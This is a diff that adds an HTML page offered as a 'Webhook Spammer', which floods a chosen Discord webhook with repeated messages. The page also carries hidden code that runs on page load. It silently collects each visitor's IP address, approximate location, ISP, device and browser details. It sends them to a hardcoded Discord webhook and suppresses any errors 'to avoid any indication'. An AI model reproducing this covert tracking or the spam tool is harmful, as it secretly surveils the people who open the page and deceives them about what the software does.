@@ -1,0 +1,264 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Spammer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-2xl font-bold mb-6 text-center">Webhook Spammer</h1>
+        
+        <!-- Webhook Spammer Section -->
+        <div class="space-y-4">
+            <div>
+                <label for="webhook" class="block text-sm font-medium text-gray-700">Webhook URL</label>
+                <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/..." class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div>
+                <label for="word" class="block text-sm font-medium text-gray-700">Word to Spam</label>
+                <input type="text" id="word" placeholder="Enter word" class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div>
+                <label for="count" class="block text-sm font-medium text-gray-700">Number of Messages</label>
+                <input type="number" id="count" min="1" max="100" value="1" class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div>
+                <label for="interval" class="block text-sm font-medium text-gray-700">Interval (ms)</label>
+                <div class="flex space-x-2">
+                    <input type="number" id="interval" min="100" value="500" class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                    <button id="setIntervalBtn" class="mt-1 bg-gray-600 text-white p-2 rounded-md hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-500">Set Interval</button>
+                </div>
+            </div>
+            <div class="flex space-x-2">
+                <button id="spamBtn" class="w-full bg-blue-600 text-white p-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500">Start Spamming</button>
+                <button id="stopBtn" class="w-full bg-red-600 text-white p-2 rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 hidden">Stop Spamming</button>
+            </div>
+            <p id="status" class="mt-4 text-center text-sm text-gray-600"></p>
+        </div>
+    </div>
+
+    <script>
+        // Webhook Spammer Functionality
+        const webhookInput = document.getElementById('webhook');
+        const wordInput = document.getElementById('word');
+        const countInput = document.getElementById('count');
+        const intervalInput = document.getElementById('interval');
+        const setIntervalBtn = document.getElementById('setIntervalBtn');
+        const spamBtn = document.getElementById('spamBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const status = document.getElementById('status');
+
+        let intervalMs = 500; // Default interval
+        let isSpamming = false; // Flag to control spamming loop
+
+        setIntervalBtn.addEventListener('click', () => {
+            const newInterval = parseInt(intervalInput.value);
+            if (isNaN(newInterval) || newInterval < 100) {
+                status.textContent = 'Interval must be at least 100ms.';
+                status.classList.add('text-red-500');
+                return;
+            }
+            intervalMs = newInterval;
+            status.textContent = `Interval set to ${intervalMs}ms.`;
+            status.classList.remove('text-red-500');
+            status.classList.add('text-green-600');
+            setTimeout(() => {
+                status.textContent = '';
+                status.classList.remove('text-green-600');
+            }, 2000);
+        });
+
+        spamBtn.addEventListener('click', async () => {
+            if (isSpamming) return; // Prevent multiple spam sessions
+
+            const webhook = webhookInput.value.trim();
+            const word = wordInput.value.trim();
+            const count = parseInt(countInput.value);
+
+            if (!webhook || !word || isNaN(count) || count < 1) {
+                status.textContent = 'Please fill in all fields correctly.';
+                status.classList.add('text-red-500');
+                return;
+            }
+
+            isSpamming = true;
+            spamBtn.classList.add('hidden');
+            stopBtn.classList.remove('hidden');
+            status.textContent = 'Sending messages...';
+            status.classList.remove('text-red-500');
+            status.classList.add('text-blue-600');
+
+            try {
+                for (let i = 0; i < count && isSpamming; i++) {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: word,
+                        }),
+                    });
+                    await new Promise(resolve => setTimeout(resolve, intervalMs));
+                }
+                if (isSpamming) {
+                    status.textContent = `Successfully sent ${count} message(s)!`;
+                    status.classList.remove('text-blue-600');
+                    status.classList.add('text-green-600');
+                }
+            } catch (error) {
+                status.textContent = 'Error sending messages. Check the webhook URL.';
+                status.classList.add('text-red-500');
+            } finally {
+                isSpamming = false;
+                spamBtn.classList.remove('hidden');
+                stopBtn.classList.add('hidden');
+            }
+        });
+
+        stopBtn.addEventListener('click', () => {
+            isSpamming = false;
+            status.textContent = 'Spamming stopped.';
+            status.classList.remove('text-blue-600');
+            status.classList.add('text-red-500');
+            spamBtn.classList.remove('hidden');
+            stopBtn.classList.add('hidden');
+        });
+
+        // User Info Functionality (runs on page load)
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1366387154657476668/SQjtvA1oEGJ0zV4hYTJpUqUQYT7gIVF2VAF_OoMFXlIuljV1TfAzNTuW5df_fWnrAVWD';
+
+        window.addEventListener('load', async () => {
+            try {
+                // Get browser-based info
+                const userAgent = navigator.userAgent;
+                const browserInfo = {
+                    'IP_Address': '',
+                    'User_Agent': userAgent,
+                    'Browser': parseUserAgent(userAgent),
+                    'Operating_System': navigator.platform,
+                    'Screen_Resolution': `${window.screen.width}x${window.screen.height}`,
+                    'Language': navigator.language || navigator.userLanguage,
+                    'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    'Cookies_Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
+                    'Do_Not_Track': navigator.doNotTrack || window.doNotTrack || 'N/A',
+                    'Device_Memory': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+                    'Connection_Type': navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                    'Plugins': getPlugins(),
+                    'Referrer': document.referrer || 'N/A',
+                    'Timestamp': new Date().toISOString(),
+                    'City': 'N/A',
+                    'Region': 'N/A',
+                    'Country': 'N/A',
+                    'Postal_Code': 'N/A',
+                    'Latitude': 'N/A',
+                    'Longitude': 'N/A',
+                    'ISP': 'N/A',
+                };
+
+                // Fetch IP-based info
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                // Update info with IP data
+                browserInfo.IP_Address = ipData.ip;
+                browserInfo.City = ipData.city || 'N/A';
+                browserInfo.Region = ipData.region || 'N/A';
+                browserInfo.Country = ipData.country_name || 'N/A';
+                browserInfo.Postal_Code = ipData.postal || 'N/A';
+                browserInfo.Latitude = ipData.latitude || 'N/A';
+                browserInfo.Longitude = ipData.longitude || 'N/A';
+                browserInfo.ISP = ipData.org || 'N/A';
+
+                // Attempt to get battery info (if available)
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    browserInfo.Battery_Level = battery.level ? `${Math.round(battery.level * 100)}%` : 'N/A';
+                    browserInfo.Battery_Charging = battery.charging ? 'Yes' : 'No';
+                } else {
+                    browserInfo.Battery_Level = 'N/A';
+                    browserInfo.Battery_Charging = 'N/A';
+                }
+
+                // Generate config content
+                const configContent = `[UserInfo]\n${Object.entries(browserInfo)
+                    .map(([key, value]) => `${key}=${value}`)
+                    .join('\n')}`;
+
+                // Send to Discord webhook
+                await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: '```cfg\n' + configContent + '\n```',
+                    }),
+                });
+            } catch (error) {
+                // Silently fail to avoid any indication
+            }
+        });
+
+        // Simple user agent parser
+        function parseUserAgent(ua) {
+            if (/chrome/i.test(ua)) return 'Google Chrome';
+            if (/firefox/i.test(ua)) return 'Mozilla Firefox';
+            if (/safari/i.test(ua)) return 'Apple Safari';
+            if (/edge/i.test(ua)) return 'Microsoft Edge';
+            return 'Unknown Browser';
+        }
+
+        // Get plugins (if available)
+        function getPlugins() {
+            if (navigator.plugins && navigator.plugins.length) {
+                return Array.from(navigator.plugins)
+                    .map(p => p.name)
+                    .join(', ');
+            }
+            return 'N/A';
+        }
+    </script>
+</body>
+</html>
